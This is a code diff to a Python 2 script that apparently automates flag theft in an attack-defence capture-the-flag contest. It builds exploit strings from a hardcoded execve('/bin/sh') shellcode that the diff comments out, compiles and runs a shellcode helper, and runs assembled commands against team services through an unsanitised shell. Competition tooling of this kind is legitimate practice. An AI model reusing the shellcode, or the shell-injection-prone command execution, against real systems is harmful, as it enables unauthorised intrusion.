@@ -27,9 +27,9 @@ def getInput(display_msg):
 
 
 def getShellCode(my_command):
-    #subprocess.Popen("gcc -m32 -z execstack prog_shell.c", shell=True, stdout=subprocess.PIPE).stdout.read()
-    #return subprocess.Popen("./a.out " + my_command, shell=True, stdout=subprocess.PIPE).stdout.read()
-    return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" 
+    subprocess.Popen("gcc -m32 -z execstack prog_shell.c", shell=True, stdout=subprocess.PIPE).stdout.read()
+    return subprocess.Popen("./a.out " + my_command, shell=True, stdout=subprocess.PIPE).stdout.read()
+    #return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" 
 
 
 def getExploitString(shell_command):
@@ -62,17 +62,12 @@ def getCommand(string):
         if(string[sindex+1]!='_'):
             var = string[sindex:eindex+1]
         
-            print "******"
-
             print var
 
-            print "*******"
             if varDict.__contains__(var):
                 val = varDict[var]
             else:
-                print "xxxxxxxx"
                 val = getInput(var + " = ")
-                print "xxxxxxxx"
             if var == "$shellcode;":
                 val = getExploitString(val)
             if var == "$address;":
@@ -100,24 +95,14 @@ def replaceServiceVar(string,teamNum):
         if(string[sindex+1]=='_'):
             var = string[sindex:eindex+1]
         
-            print "****Service**"
+            print var
 
-            print var,string[(sindex+2):eindex]
-
-            print "***Service****"
-            """if varDict.__contains__(var):
-                val = varDict[var]
-            else:"""
-            
             print serviceList[teamNum][string[sindex+2:eindex]]
             val = str(serviceList[teamNum][string[sindex+2:eindex]])
-            print "11111"
             string = string.replace(var,val)
-            print "22222"
         else:
             nonServiceVarFound=1
 
-    print "outside ",string 
     return string
 
 
@@ -152,12 +137,18 @@ def getFlags(command,teamNum):
     
     print command
     
-    proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,)
-        
+    try:
     
-    output=proc.communicate()[0]
-    print output
+        proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,)
+
+
+        output=proc.communicate()[0]
+        print output
         
+    except:
+        print("Unexpected error:", sys.exc_info()[0])
+        raise
+
 
     
 def attackTeams(command,teamNum):
